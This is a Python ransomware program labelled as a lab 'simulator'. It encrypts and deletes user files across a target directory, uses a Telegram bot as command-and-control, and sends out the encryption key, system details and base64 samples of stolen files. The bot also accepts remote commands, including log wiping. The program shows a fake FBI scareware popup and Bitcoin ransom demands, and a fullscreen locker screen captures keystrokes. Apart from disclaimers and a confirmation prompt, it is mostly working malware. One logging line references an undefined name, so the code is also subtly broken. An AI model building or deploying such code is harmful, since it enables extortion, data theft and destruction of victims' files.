# This is a ransomware simulator for cybersecurity learning in a personal lab.
# WARNING: Use only in a controlled, isolated environment (e.g., virtual machine).
# Unauthorized use is illegal and unethical.

import os
import time
import threading
import queue
import logging
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import Label, messagebox
from datetime import datetime, timedelta
import keyboard  # For Locker bypass detection
import requests  # For Telegram API communications
import socket  # To get machine information
import platform  # To get system information
import json  # For formatting data
import uuid  # For unique machine ID
import base64  # For encoding binary data
import random
import string

# Configuration
TARGET_DIR = "C:\\test_files"  # CHANGE TO "C:\\" FOR FULL SYSTEM IN LAB ONLY
ENCRYPTED_EXT = ".encrypted"
KEY_FILE = "decryption_key.txt"
LOG_FILE = "encryption_log.txt"
RANSOM_NOTE = "ransom_note.txt"
LEAKED_DATA_FILE = "leaked_data.txt"
LOCK_LOG_FILE = "lock_log.txt"
C2_BUFFER_FILE = "c2_buffer.txt"
FILE_TYPES = (
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".png", ".gif", ".bmp",
    ".mp3", ".mp4", ".avi", ".mkv",
    ".zip", ".rar", ".7z",
    ".conf", ".ini", ".yaml", ".json",
    ".py", ".java", ".cpp", ".cs", ".js",
    ".sql", ".db", ".sqlite",
)
THREAD_COUNT = 4
COUNTDOWN_HOURS = 72
BRUTE_FORCE_ATTEMPTS = 3
BRUTE_FORCE_DELAY = 1
SCAREWARE_DURATION = 30  # Seconds for Scareware pop-up
C2_COMMAND_CHECK_INTERVAL = 5  # Seconds between command checks

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")  # Replace or use env variable
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")  # Replace or use env variable
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
C2_ENABLED = True  # Enable/disable C2 functionality
C2_RETRY_COUNT = 3  # Number of retries for C2 communication
C2_RETRY_DELAY = 5  # Seconds between retries
C2_REPORT_INTERVAL = 300  # Seconds between status reports to C2

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Setup lock logging
lock_logger = logging.getLogger("lock")
lock_handler_logger.setLevel(logging.INFO)
lock_handler = logging.FileHandler(LOCK_LOG_FILE)
lock_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
lock_logger.addHandler(lock_handler)

class RansomwareSimulator:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.file_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.locked = False
        self.locker_code = None
        self.random_key = None
        self.machine_id = str(uuid.uuid4())
        self.encrypted_count = 0
        self.failed_count = 0
        self.c2_last_report = 0
        self.c2_buffer = []

        # Start C2 threads if enabled
        if C2_ENABLED:
            self.c2_report_thread = threading.Thread(target=self.c2_reporting_thread)
            self.c2_report_thread.daemon = True
            self.c2_report_thread.start()
            self.c2_command_thread = threading.Thread(target=self.c2_command_thread)
            self.c2_command_thread.daemon = True
            self.c2_command_thread.start()

    def save_key(self):
        """Save the decryption key."""
        with open(KEY_FILE, "wb") as f:
            f.write(self.key)
        logging.info(f"Decryption key saved to {KEY_FILE}")
        if C2_ENABLED:
            self.send_key_to_c2()

    def send_key_to_c2(self):
        """Send encryption key to C2 server via Telegram."""
        key_b64 = base64.b64encode(self.key).decode('utf-8')
        message = f"🔑 NEW INFECTION 🔑\n\nMachine ID: {self.machine_id}\nKey: {key_b64}\nTimestamp: {datetime.now()}"
        for attempt in range(C2_RETRY_COUNT):
            try:
                self.send_telegram_message(message)
                logging.info("Key successfully sent to C2 server")
                return True
            except Exception as e:
                logging.error(f"C2 key sending error (attempt {attempt + 1}/{C2_RETRY_COUNT}): {str(e)}")
                time.sleep(C2_RETRY_DELAY)
        logging.critical("Failed to send key to C2 server after multiple attempts")
        return False

    def collect_system_info(self):
        """Collect system information for C2 reporting."""
        try:
            info = {
                "machine_id": self.machine_id,
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "os": platform.system(),
                "os_version": platform.version(),
                "username": os.getlogin(),
                "encrypted_count": self.encrypted_count,
                "failed_count": self.failed_count,
                "timestamp": str(datetime.now()),
                "status": "active" if not self.stop_event.is_set() else "completed"
            }
            return info
        except Exception as e:
            logging.error(f"Error collecting system info: {str(e)}")
            return {"machine_id": self.machine_id, "error": str(e)}

    def buffer_message(self, message):
        """Buffer a message locally if Telegram API fails."""
        try:
            with open(C2_BUFFER_FILE, "a") as f:
                f.write(f"{datetime.now()} - {message}\n")
            self.c2_buffer.append(message)
            logging.info(f"Buffered message: {message}")
        except Exception as e:
            logging.error(f"Error buffering message: {str(e)}")

    def flush_buffer(self):
        """Attempt to send buffered messages."""
        if not self.c2_buffer:
            return
        remaining = []
        for message in self.c2_buffer:
            try:
                self.send_telegram_message(message)
                logging.info(f"Sent buffered message: {message}")
            except Exception:
                remaining.append(message)
        self.c2_buffer = remaining
        try:
            with open(C2_BUFFER_FILE, "w") as f:
                for message in self.c2_buffer:
                    f.write(f"{datetime.now()} - {message}\n")
        except Exception as e:
            logging.error(f"Error updating buffer file: {str(e)}")

    def send_telegram_message(self, message):
        """Send a message to Telegram bot with buffering on failure."""
        url = f"{TELEGRAM_API_URL}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, data=data)
            if response.status_code != 200:
                raise Exception(f"Telegram API error: {response.text}")
            return response.json()
        except Exception as e:
            self.buffer_message(message)
            raise e

    def c2_reporting_thread(self):
        """Background thread for periodic status reports to C2."""
        while not self.stop_event.is_set():
            current_time = time.time()
            if current_time - self.c2_last_report >= C2_REPORT_INTERVAL:
                try:
                    system_info = self.collect_system_info()
                    message = f"📊 STATUS REPORT 📊\n\n```{json.dumps(system_info, indent=2)}```"
                    self.send_telegram_message(message)
                    self.c2_last_report = current_time
                    logging.info("Status report sent to C2 server")
                except Exception as e:
                    logging.error(f"C2 status reporting error: {str(e)}")
            time.sleep(10)

    def c2_command_thread(self):
        """Background thread to check for C2 commands."""
        while not self.stop_event.is_set():
            try:
                self.check_for_c2_commands()
                self.flush_buffer()
                time.sleep(C2_COMMAND_CHECK_INTERVAL)
            except Exception as e:
                logging.error(f"C2 command thread error: {str(e)}")
                time.sleep(C2_COMMAND_CHECK_INTERVAL)

    def check_for_c2_commands(self):
        """Check for commands from C2 server via Telegram."""
        if not C2_ENABLED:
            return None
        try:
            url = f"{TELEGRAM_API_URL}/getUpdates"
            response = requests.get(url)
            if response.status_code != 200:
                logging.error(f"C2 command check error: {response.text}")
                return None
            data = response.json()
            if not data.get("ok"):
                return None
            results = data.get("result", [])
            for update in results:
                message = update.get("message", {})
                if str(message.get("chat", {}).get("id")) == TELEGRAM_CHAT_ID:
                    text = message.get("text", "")
                    if text.startswith("/cmd "):
                        command = text[5:].strip().lower()
                        logging.info(f"Received C2 command: {command}")
                        if command == "status":
                            system_info = self.collect_system_info()
                            self.send_telegram_message(
                                f"📊 STATUS REPORT 📊\n\n```{json.dumps(system_info, indent=2)}```"
                            )
                        elif command == "stop":
                            self.stop_event.set()
                            self.send_telegram_message("🛑 STOPPING ENCRYPTION 🛑")
                        elif command == "list_files":
                            file_list = os.listdir(os.getcwd())[:10]
                            self.send_telegram_message(
                                f"📁 FILES IN WORKING DIRECTORY (TOP 10) 📁\n\n{json.dumps(file_list, indent=2)}"
                            )
                        elif command == "decrypt":
                            key_b64 = base64.b64encode(self.key).decode('utf-8')
                            self.send_telegram_message(
                                f"🗝️ DECRYPTION KEY 🗝️\n\nMachine ID: {self.machine_id}\nKey: {key_b64}"
                            )
                        elif command == "wipe":
                            for log_file in [LOG_FILE, LOCK_LOG_FILE, C2_BUFFER_FILE]:
                                try:
                                    if os.path.exists(log_file):
                                        os.remove(log_file)
                                        self.send_telegram_message(f"🧹 Wiped {log_file}")
                                except Exception as e:
                                    self.send_telegram_message(f"🧹 Error wiping {log_file}: {str(e)}")
            return None
        except Exception as e:
            logging.error(f"Error checking C2 commands: {str(e)}")
            return None

    def collect_leaked_data(self, file_path):
        """Simulate Doxware by collecting file metadata."""
        try:
            stats = os.stat(file_path)
            metadata = f"File: {file_path}, Size: {stats.st_size} bytes, Modified: {time.ctime(stats.st_mtime)}"
            with open(LEAKED_DATA_FILE, "a") as f:
                f.write(metadata + "\n")
            logging.info(f"Doxware: Collected metadata for {file_path}")
            if C2_ENABLED and os.path.getsize(file_path) < 1024:
                try:
                    with open(file_path, "rb") as f:
                        sample = f.read()
                    sample_b64 = base64.b64encode(sample).decode('utf-8')
                    message = f"📤 DATA SAMPLE 📤\n\nFile: {file_path}\nSize: {stats.st_size} bytes\nSample (Base64): {sample_b64[:500]}..."
                    self.send_telegram_message(message)
                except Exception as e:
                    logging.error(f"C2 data exfiltration error: {str(e)}")
        except Exception as e:
            logging.error(f"Doxware error for {file_path}: {str(e)}")

    def brute_force_encrypt(self, file_path):
        """Encrypt a file with brute-force retries."""
        self.collect_leaked_data(file_path)
        for attempt in range(BRUTE_FORCE_ATTEMPTS):
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = self.cipher.encrypt(data)
                encrypted_path = file_path + ENCRYPTED_EXT
                with open(encrypted_path, "wb") as f:
                    f.write(encrypted_data)
                os.remove(file_path)
                logging.info(f"Encrypted: {file_path} -> {encrypted_path}")
                self.encrypted_count += 1
                return True
            except PermissionError:
                logging.warning(f"Permission denied on attempt {attempt + 1}/{BRUTE_FORCE_ATTEMPTS}: {file_path}")
                if attempt < BRUTE_FORCE_ATTEMPTS - 1:
                    time.sleep(BRUTE_FORCE_DELAY)
            except Exception as e:
                logging.error(f"Error encrypting {file_path}: {str(e)}")
                self.failed_count += 1
                return False
        logging.error(f"Failed to encrypt after {BRUTE_FORCE_ATTEMPTS} attempts: {file_path}")
        self.failed_count += 1
        return False

    def traverse_and_queue(self, directory):
        """Recursively traverse directory and queue files."""
        try:
            for root, _, files in os.walk(directory):
                if self.stop_event.is_set():
                    break
                for file in files:
                    if file.endswith(FILE_TYPES) and not file.endswith(ENCRYPTED_EXT):
                        file_path = os.path.join(root, file)
                        self.file_queue.put(file_path)
        except Exception as e:
            logging.error(f"Error traversing {directory}: {str(e)}")

    def worker(self):
        """Worker thread to encrypt files."""
        while not self.stop_event.is_set():
            try:
                file_path = self.file_queue.get_nowait()
                self.brute_force_encrypt(file_path)
                self.file_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                logging.error(f"Worker error: {str(e)}")

    def start_encryption(self):
        """Start multithreaded encryption."""
        logging.info("Starting encryption")
        self.traverse_and_queue(TARGET_DIR)
        if C2_ENABLED:
            try:
                queue_size = self.file_queue.qsize()
                message = (
                    f"🔒 ENCRYPTION STARTED 🔒\n\n"
                    f"Machine ID: {self.machine_id}\n"
                    f"Target directory: {TARGET_DIR}\n"
                    f"Files queued: {queue_size}\n"
                    f"Timestamp: {datetime.now()}"
                )
                self.send_telegram_message(message)
            except Exception as e:
                logging.error(f"C2 start report error: {str(e)}")
        threads = []
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        logging.info("Encryption completed")
        if C2_ENABLED:
            try:
                message = (
                    f"✅ ENCRYPTION COMPLETED ✅\n\n"
                    f"Machine ID: {self.machine_id}\n"
                    f"Encrypted files: {self.encrypted_count}\n"
                    f"Failed files: {self.failed_count}\n"
                    f"Timestamp: {datetime.now()}"
                )
                self.send_telegram_message(message)
            except Exception as e:
                logging.error(f"C2 completion report error: {str(e)}")

    def create_ransom_note(self):
        """Create a ransom note."""
        note_content = (
            "💾 ROOTKILLER ENCRYPTION 💾\n\n"
            "🔒 Your files are locked in a digital vault! 🔒\n"
            "📡 Sensitive data has been collected and may be leaked! 📡\n"
            f"🗝️ Decryption key: {KEY_FILE}\n"
            "⚠️ This is a controlled cybersecurity exercise. No real harm intended! ⚠️\n"
            "💀 We'd contact you after payment is received 💀\n"
        )
        try:
            with open(RANSOM_NOTE, "w") as f:
                f.write(note_content)
            logging.info(f"Ransom note created: {RANSOM_NOTE}")
        except Exception as e:
            logging.error(f"Error creating ransom note: {str(e)}")

    def show_scareware_popup(self):
        """Display a Scareware pop-up."""
        root = tk.Tk()
        root.title("🚨 FBI WARNING 🚨")
        root.geometry("400x300")
        root.configure(bg="red")
        message = (
            "🚨 SYSTEM COMPROMISED! 🚨\n\n"
            "⚠️ FBI ALERT: Illegal activity detected! (Simulation) ⚠️\n"
            "Your files are encrypted, and data will be leaked!\n"
            "Pay $1000 in Bitcoin to avoid prosecution!\n"
            "⏰ We'd contact you after payment is received ⏰\n"
        )
        tk.Label(
            root,
            text=message,
            bg="red",
            fg="white",
            font=("Consolas", 12),
            justify="center",
            wraplength=350
        ).pack(pady=20)
        def close_popup():
            root.destroy()
        root.after(SCAREWARE_DURATION * 1000, close_popup)
        root.mainloop()
        logging.info("Scareware pop-up displayed")
        if C2_ENABLED:
            try:
                message = f"😱 SCAREWARE DISPLAYED 😱\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                self.send_telegram_message(message)
            except Exception as e:
                logging.error(f"C2 scareware report error: {str(e)}")

    def generate_locker_code(self):
        """Generate a 6-digit code for locker bypass."""
        return ''.join(random.choices(string.digits, k=6))

    def generate_random_key(self):
        """Generate a random key combination for locker bypass."""
        letters = string.ascii_lowercase
        return f"ctrl+alt+{random.choice(letters)}"

    def show_locker_screen(self):
        """Display a Locker Ransomware screen with Telegram code input."""
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        self.locked = True
        lock_logger.info("Screen locked")
        if C2_ENABLED:
            self.locker_code = self.generate_locker_code()
            try:
                message = (
                    f"🔒 LOCKER SCREEN ACTIVATED 🔒\n\n"
                    f"Machine ID: {self.machine_id}\n"
                    f"Bypass Code: {self.locker_code}\n"
                    f"Timestamp: {datetime.now()}"
                )
                self.send_telegram_message(message)
                lock_logger.info(f"Sent locker code: {self.locker_code}")
            except Exception as e:
                logging.error(f"C2 locker report error: {str(e)}")
                self.locker_code = None
        if not self.locker_code:
            self.random_key = self.generate_random_key()
            lock_logger.info(f"Telegram disabled or failed. Random key: {self.random_key}")
        message = (
            "🔐 SYSTEM LOCKED 🔐\n\n"
            "💾 Your device is under our control! 💾\n"
            "Pay $500 in Bitcoin to unlock.\n"
            "📡 Data will be leaked if you refuse!\n"
            "⚠️ LAB TEST ONLY: Enter the code from Telegram or check logs for key combo ⚠️"
        )
        tk.Label(
            root,
            text=message,
            bg="black",
            fg="#00FF00",
            font=("Consolas", 16),
            justify="center",
            wraplength=600
        ).pack(pady=20)
        code_var = tk.StringVar()
        tk.Entry(
            root,
            textvariable=code_var,
            bg="black",
            fg="#00FF00",
            font=("Consolas", 12),
            insertbackground="#00FF00",
            justify="center"
        ).pack(pady=10)
        def validate_code():
            entered_code = code_var.get().strip()
            if self.locker_code and entered_code == self.locker_code:
                self.locked = False
                lock_logger.info("Screen unlocked via correct code")
                if C2_ENABLED:
                    try:
                        self.send_telegram_message(
                            f"🔓 LOCKER BYPASSED 🔓\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                        )
                    except Exception as e:
                        logging.error(f"C2 bypass report error: {str(e)}")
                root.destroy()
            else:
                lock_logger.warning(f"Invalid code entered: {entered_code}")
                messagebox.showerror("Error", "Incorrect code!")
        tk.Button(
            root,
            text="Submit Code",
            command=validate_code,
            bg="#00FF00",
            fg="black",
            font=("Consolas", 12, "bold")
        ).pack(pady=10)
        def check_random_key():
            if self.random_key and keyboard.is_pressed(self.random_key):
                self.locked = False
                lock_logger.info(f"Screen unlocked via random key: {self.random_key}")
                if C2_ENABLED:
                    try:
                        self.send_telegram_message(
                            f"🔓 LOCKER BYPASSED 🔓\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                        )
                    except Exception as e:
                        logging.error(f"C2 bypass report error: {str(e)}")
                root.destroy()
            elif self.random_key:
                pressed = keyboard.read_event(suppress=True).name
                if pressed:
                    lock_logger.info(f"Key pressed: {pressed}")
            root.after(100, check_random_key)
        if self.random_key:
            check_random_key()
        root.mainloop()

    def show_ransom_gui(self):
        """Display main ransom GUI with Crypto and Doxware demands."""
        root = tk.Tk()
        root.title("🔒 ROOT KILLER ENCRYPTION 🔒")
        root.geometry("500x500")
        root.configure(bg="black")
        if C2_ENABLED:
            try:
                message = f"💰 RANSOM GUI DISPLAYED 💰\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                self.send_telegram_message(message)
            except Exception as e:
                logging.error(f"C2 GUI report error: {str(e)}")
        message = (
            "🔒 YOUR FILES ARE ENCRYPTED 🔒\n"
            "📡 SENSITIVE DATA COLLECTED FOR LEAK 📡\n"
            "Pay 0.1 BTC to: 1FakeBitcoinAddressXYZ\n"
            f"🗝️ Decryption key: {KEY_FILE}\n"
            "💀 LAB TEST ONLY: Unauthorized use is ILLEGAL! 💀\n"
        )
        tk.Label(
            root,
            text=message,
            bg="black",
            fg="#00FF00",
            font=("Consolas", 12),
            justify="center",
            wraplength=450
        ).pack(pady=20)
        deadline = datetime.now() + timedelta(hours=COUNTDOWN_HOURS)
        timer_label = tk.Label(
            root,
            text="",
            bg="black",
            fg="#00FF00",
            font=("Consolas", 16, "bold")
        )
        timer_label.pack(pady=20)
        def update_timer():
            if self.stop_event.is_set():
                return
            remaining = deadline - datetime.now()
            if remaining.total_seconds() <= 0:
                timer_label.config(text="💥 TIME'S UP! 💥")
                if C2_ENABLED:
                    try:
                        message = f"⏰ DEADLINE REACHED ⏰\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                        self.send_telegram_message(message)
                    except Exception as e:
                        logging.error(f"C2 deadline report error: {str(e)}")
                return
            hours, remainder = divmod(remaining.seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            timer_label.config(text=f"⏰ {hours:02d}:{minutes:02d}:{seconds:02d} ⏰")
            root.after(1000, update_timer)
        update_timer()
        def simulate_payment():
            logging.info("Simulated payment attempt")
            if C2_ENABLED:
                try:
                    message = f"💸 PAYMENT ATTEMPT 💸\n\nMachine ID: {self.machine_id}\nTimestamp: {datetime.now()}"
                    self.send_telegram_message(message)
                except Exception as e:
                    logging.error(f"C2 payment report error: {str(e)}")
        def exit_encryption():
            self.stop_event.set()
            if C2_ENABLED:
                try:
                    message = (
                        f"🚪 ENCRYPTION EXITED 🚪\n\n"
                        f"Machine ID: {self.machine_id}\n"
                        f"Timestamp: {datetime.now()}\n"
                        f"Encrypted files: {self.encrypted_count}\n"
                        f"Failed files: {self.failed_count}"
                    )
                    self.send_telegram_message(message)
                except Exception as e:
                    logging.error(f"C2 exit report error: {str(e)}")
            root.destroy()
        tk.Button(
            root,
            text="💸 Simulate Payment (Lab Test) 💸",
            command=simulate_payment,
            bg="#00FF00",
            fg="black",
            font=("Consolas", 12, "bold"),
            activebackground="#00CC00",
            relief="flat"
        ).pack(pady=20)
        tk.Button(
            root,
            text="🚪 EXIT ENCRYPTION 🚪",
            command=exit_encryption,
            bg="#00FF00",
            fg="black",
            font=("Consolas", 12, "bold"),
            activebackground="#00CC00",
            relief="flat"
        ).pack(pady=20)
        root.mainloop()

def main():
    print("WARNING: This is a ransomware simulator for lab use only. Ensure you are in a controlled environment.")
    if input("Continue? (y/n): ").lower() != 'y':
        print("Aborted.")
        return
    simulator = RansomwareSimulator()
    if C2_ENABLED:
        try:
            system_info = simulator.collect_system_info()
            message = (
                f"🔄 ENCRYPTION STARTED 🔄\n\n"
                f"Machine ID: {simulator.machine_id}\n"
                f"Target: {TARGET_DIR}\n"
                f"System: {system_info['os']} {system_info['os_version']}\n"
                f"User: {system_info['username']}\n"
                f"Timestamp: {datetime.now()}"
            )
            simulator.send_telegram_message(message)
            logging.info("C2 connection established")
        except Exception as e:
            logging.error(f"C2 connection error: {str(e)}")
    simulator.save_key()
    simulator.start_encryption()
    simulator.create_ransom_note()
    simulator.show_scareware_popup()
    simulator.show_locker_screen()
    if not simulator.locked:
        simulator.show_ransom_gui()
    if C2_ENABLED:
        try:
            message = (
                f"🏁 ENCRYPTION COMPLETED 🏁\n\n"
                f"Machine ID: {simulator.machine_id}\n"
                f"Encrypted files: {simulator.encrypted_count}\n"
                f"Failed files: {simulator.failed_count}\n"
                f"Timestamp: {datetime.now()}"
            )
            simulator.send_telegram_message(message)
        except Exception as e:
            logging.error(f"Final C2 report error: {str(e)}")

if __name__ == "__main__":
    main()